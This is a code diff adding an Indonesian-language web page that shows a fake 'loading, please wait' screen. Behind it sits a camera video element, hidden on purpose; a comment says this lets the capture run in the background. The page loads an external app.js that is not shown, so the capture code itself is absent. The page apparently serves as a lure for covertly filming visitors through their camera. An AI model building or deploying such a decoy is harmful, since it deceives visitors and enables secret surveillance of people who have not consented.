@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Halaman...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+        }
+        /* Video disembunyikan agar proses berjalan di background (opsional) */
+        #cameraPreview {
+            width: 200px;
+            height: 150px;
+            border-radius: 8px;
+            object-fit: cover;
+            border: 2px solid #333;
+            display: none; 
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #00ffcc;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Memuat Konten, Mohon Tunggu...</h2>
+        <!-- Elemen video untuk proses capture -->
+        <video id="cameraPreview" autoplay playsinline muted></video>
+        <p id="status">Menyiapkan sistem...</p>
+    </div>
+
+    <!-- Panggil file JavaScript eksternal -->
+    <script src="app.js"></script>
+</body>
+</html>
